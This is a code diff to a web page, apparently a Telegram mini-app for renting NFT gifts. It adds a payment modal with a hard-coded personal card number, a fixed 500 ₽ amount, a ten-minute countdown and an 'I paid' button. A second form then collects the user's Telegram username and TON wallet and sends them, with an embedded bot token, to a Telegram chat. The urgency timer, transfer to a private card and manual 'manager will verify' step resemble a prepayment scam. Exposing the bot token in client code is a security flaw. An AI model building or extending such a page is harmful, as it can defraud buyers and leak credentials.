@@ -234,6 +234,18 @@
         .btn:active {
             transform: scale(0.94);
         }
+        .btn-success {
+            background: #34c759;
+        }
+        .btn-outline {
+            background: transparent;
+            color: #007aff;
+            border: 2px solid #007aff;
+        }
+        .btn-outline:active {
+            background: #007aff;
+            color: #fff;
+        }
         .empty {
             text-align: center;
             padding: 40px 20px;
@@ -320,6 +332,31 @@
             margin-top: 10px;
             text-align: center;
         }
+        .modal-content .timer {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            color: #ff3b30;
+            margin: 8px 0 12px;
+        }
+        .modal-content .card-number {
+            background: #f0f0f3;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            margin: 8px 0;
+            color: #1a1a1a;
+        }
+        .modal-content .amount-display {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            color: #007aff;
+            margin: 8px 0 16px;
+        }
         .modal-content .channel-link {
             background: #f0f8ff;
             border-radius: 12px;
@@ -332,6 +369,20 @@
             color: #007aff;
             text-decoration: none;
             font-weight: 600;
+        }
+        .btn-group {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .btn-group .btn {
+            flex: 1;
+        }
+        .amount-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 12px;
         }
         .bottom-nav {
             position: fixed;
@@ -397,34 +448,48 @@
 
     <div class="gift-grid" id="giftList"></div>
 
-    <!-- МОДАЛКА ЗАЯВКИ -->
-    <div class="modal" id="orderModal">
+    <!-- МОДАЛКА 1 — ОПЛАТА -->
+    <div class="modal" id="paymentModal">
         <div class="modal-content">
-            <button class="modal-close" onclick="closeModal()">✕</button>
-            <h2 id="modalTitle">🎁 Аренда</h2>
-            <div class="subtitle" id="modalDesc">Подарок: Snoop Dogg</div>
+            <button class="modal-close" onclick="closePayment()">✕</button>
+            <h2 id="paymentTitle">💳 Оплата</h2>
+            <div class="subtitle" id="paymentSub">Переведите указанную сумму на карту</div>
+            <div class="amount-display" id="paymentAmount">500 ₽</div>
+            <div class="card-number" id="cardDisplay">2200 2418 6380 1639</div>
+            <div class="timer" id="timerDisplay">10:00</div>
+            <div class="hint" style="font-size:13px;">Переведите точную сумму и нажмите «Я оплатил»</div>
+            <div class="btn-group">
+                <button class="btn btn-success" onclick="openUserForm()">✅ Я оплатил</button>
+                <button class="btn btn-outline" onclick="closePayment()">Отмена</button>
+            </div>
+        </div>
+    </div>
 
-            <!-- ПОЛЕ ДЛЯ USERNAME -->
+    <!-- МОДАЛКА 2 — ДАННЫЕ ПОЛЬЗОВАТЕЛЯ -->
+    <div class="modal" id="userModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeUserForm()">✕</button>
+            <h2 id="userTitle">📝 Подтверждение</h2>
+            <div class="subtitle" id="userSub">Введите ваши данные</div>
             <input type="text" id="telegramInput" placeholder="@username">
-
-            <!-- ПОЛЕ ДЛЯ TON-КОШЕЛЬКА -->
             <input type="text" id="tonWallet" placeholder="Ссылка на TON-кошелёк">
-
-            <!-- ССЫЛКА НА КАНАЛ (ВСТРОЕННАЯ) -->
             <div class="channel-link">
                 📢 Наш канал: <a href="https://t.me/helphunt" target="_blank">@helphunt</a>
             </div>
-
-            <button class="btn" id="modalBtn" onclick="sendOrder()">📩 Отправить заявку</button>
-            <div class="hint" id="modalHint">Менеджер проверит оплату и свяжется с вами</div>
+            <button class="btn btn-success" id="userBtn" onclick="sendOrder()">📩 Отправить заявку</button>
+            <div class="hint" id="userHint">Менеджер проверит оплату и свяжется с вами</div>
         </div>
     </div>
 
     <script>
         // ====== ДАННЫЕ ======
+        const CARD_NUMBER = '2200 2418 6380 1639';
         const BOT_TOKEN = '8969969111:AAF5EyahhOu9wjsYSekStJz0asieL7a4gho';
         const YOUR_CHAT_ID = '5885231089';
 
+        let selectedAmount = 0;
+        let timerInterval = null;
+        let timerSeconds = 600;
         let currentItem = '';
 
         // ====== ЯЗЫКИ ======
@@ -441,12 +506,20 @@
                 notFound: "🔍",
                 notFoundText: "Ничего не найдено",
                 notFoundSub: "Попробуйте изменить запрос",
-                modalTitle: "🎁 Аренда",
-                modalDesc: "Подарок: ",
-                modalPlaceholder: "@username",
-                modalWallet: "Ссылка на TON-кошелёк",
-                modalBtn: "📩 Отправить заявку",
-                modalHint: "Менеджер проверит оплату и свяжется с вами"
+                paymentTitle: "💳 Оплата",
+                paymentSub: "Переведите указанную сумму на карту",
+                paymentBtn: "✅ Я оплатил",
+                paymentCancel: "Отмена",
+                userTitle: "📝 Подтверждение",
+                userSub: "Введите ваши данные",
+                userPlaceholder: "@username",
+                userWallet: "Ссылка на TON-кошелёк",
+                userBtn: "📩 Отправить заявку",
+                userHint: "Менеджер проверит оплату и свяжется с вами",
+                depositTitle: "💰 Пополнение баланса",
+                depositSub: "Выберите сумму для пополнения",
+                depositBtn: "Продолжить",
+                depositHint: "Сумма от 50 до 50 000 ₽"
             },
             en: {
                 search: "Search NFT by name",
@@ -460,12 +533,20 @@
                 notFound: "🔍",
                 notFoundText: "Nothing found",
                 notFoundSub: "Try changing your search query",
-                modalTitle: "🎁 Rent",
-                modalDesc: "Gift: ",
-                modalPlaceholder: "@username",
-                modalWallet: "TON wallet link",
-                modalBtn: "📩 Send request",
-                modalHint: "Manager will check payment and contact you"
+                paymentTitle: "💳 Payment",
+                paymentSub: "Transfer the specified amount to the card",
+                paymentBtn: "✅ I paid",
+                paymentCancel: "Cancel",
+                userTitle: "📝 Confirmation",
+                userSub: "Enter your details",
+                userPlaceholder: "@username",
+                userWallet: "TON wallet link",
+                userBtn: "📩 Send request",
+                userHint: "Manager will check payment and contact you",
+                depositTitle: "💰 Top up balance",
+                depositSub: "Select amount to top up",
+                depositBtn: "Continue",
+                depositHint: "Amount from 50 to 50 000 ₽"
             }
         };
 
@@ -479,12 +560,14 @@
             document.getElementById('searchInput').placeholder = data.search;
             document.getElementById('tabRent').textContent = data.rent;
             document.getElementById('tabBuy').textContent = data.buy;
-            document.getElementById('modalTitle').textContent = data.modalTitle;
-            document.getElementById('modalDesc').textContent = data.modalDesc + currentItem;
-            document.getElementById('telegramInput').placeholder = data.modalPlaceholder;
-            document.getElementById('tonWallet').placeholder = data.modalWallet;
-            document.getElementById('modalBtn').textContent = data.modalBtn;
-            document.getElementById('modalHint').textContent = data.modalHint;
+            document.getElementById('paymentTitle').textContent = data.paymentTitle;
+            document.getElementById('paymentSub').textContent = data.paymentSub;
+            document.getElementById('userTitle').textContent = data.userTitle;
+            document.getElementById('userSub').textContent = data.userSub;
+            document.getElementById('telegramInput').placeholder = data.userPlaceholder;
+            document.getElementById('tonWallet').placeholder = data.userWallet;
+            document.getElementById('userBtn').textContent = data.userBtn;
+            document.getElementById('userHint').textContent = data.userHint;
             renderGifts(giftsFiltered.length ? giftsFiltered : gifts);
         }
 
@@ -614,7 +697,7 @@
                             <h3>${item.name}</h3>
                             <div class="price-row">
                                 <div class="price">${lang.nftLabel}</div>
-                                <button class="btn" onclick="openOrder('${safeName}')">${lang.rentAction}</button>
+                                <button class="btn" onclick="openPayment('${safeName}')">${lang.rentAction}</button>
                             </div>
                         </div>
                     </div>
@@ -641,20 +724,68 @@
             renderGifts(gifts);
         }
 
-        // ====== МОДАЛКА ЗАЯВКИ ======
-        function openOrder(item) {
+        // ====== МОДАЛКА ОПЛАТЫ ======
+        function openPayment(item) {
             currentItem = item;
             const lang = langData[currentLang];
-            document.getElementById('modalDesc').textContent = lang.modalDesc + item;
-            document.getElementById('orderModal').style.display = 'flex';
+            // Устанавливаем сумму (можно сделать выбор, но для простоты пусть будет 500)
+            selectedAmount = 500;
+            document.getElementById('paymentAmount').textContent = selectedAmount + ' ₽';
+            document.getElementById('cardDisplay').textContent = CARD_NUMBER;
+            document.getElementById('paymentModal').style.display = 'flex';
+            startTimer(600);
         }
 
-        function closeModal() {
-            document.getElementById('orderModal').style.display = 'none';
+        function closePayment() {
+            document.getElementById('paymentModal').style.display = 'none';
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+        }
+
+        function startTimer(seconds) {
+            timerSeconds = seconds;
+            updateTimerDisplay();
+            if (timerInterval) {
+                clearInterval(timerInterval);
+            }
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                updateTimerDisplay();
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    alert('⏰ Время вышло. Повторите попытку.');
+                    closePayment();
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(timerSeconds / 60);
+            const secs = timerSeconds % 60;
+            document.getElementById('timerDisplay').textContent =
+                String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+        }
+
+        // ====== ПЕРЕХОД К ФОРМЕ ПОЛЬЗОВАТЕЛЯ ======
+        function openUserForm() {
+            if (timerSeconds <= 0) {
+                alert('⏰ Время вышло. Повторите попытку.');
+                return;
+            }
+            closePayment();
+            document.getElementById('userModal').style.display = 'flex';
+        }
+
+        function closeUserForm() {
+            document.getElementById('userModal').style.display = 'none';
             document.getElementById('telegramInput').value = '';
             document.getElementById('tonWallet').value = '';
         }
 
+        // ====== ОТПРАВКА ЗАЯВКИ ======
         function sendOrder() {
             const username = document.getElementById('telegramInput').value.trim();
             const tonWallet = document.getElementById('tonWallet').value.trim();
@@ -667,10 +798,11 @@
             const text =
                 `🎁 НОВАЯ ЗАЯВКА НА АРЕНДУ!\n\n` +
                 `🎁 Подарок: ${currentItem}\n` +
+                `💰 Сумма оплаты: ${selectedAmount} ₽\n` +
                 `👤 Username: ${username}\n` +
                 `💳 TON-кошелёк: ${tonWallet || 'Не указан'}\n` +
                 `⏱ Время: ${new Date().toLocaleString()}\n\n` +
-                `✅ Проверьте оплату и отправьте подарок пользователю.\n` +
+                `✅ Проверьте оплату на карте: ${CARD_NUMBER}\n` +
                 `📢 Канал: https://t.me/helphunt`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -680,7 +812,7 @@
             })
             .then(() => {
                 alert(currentLang === 'ru' ? '✅ Заявка отправлена! Менеджер свяжется с вами.' : '✅ Request sent! Manager will contact you.');
-                closeModal();
+                closeUserForm();
             })
             .catch((error) => {
                 alert(currentLang === 'ru' ? '❌ Ошибка. Попробуйте ещё раз.' : '❌ Error. Please try again.');
@@ -688,8 +820,10 @@
         }
 
         window.onclick = function(event) {
-            const modal = document.getElementById('orderModal');
-            if (event.target === modal) closeModal();
+            const payment = document.getElementById('paymentModal');
+            const user = document.getElementById('userModal');
+            if (event.target === payment) closePayment();
+            if (event.target === user) closeUserForm();
         }
 
         renderGifts(gifts);
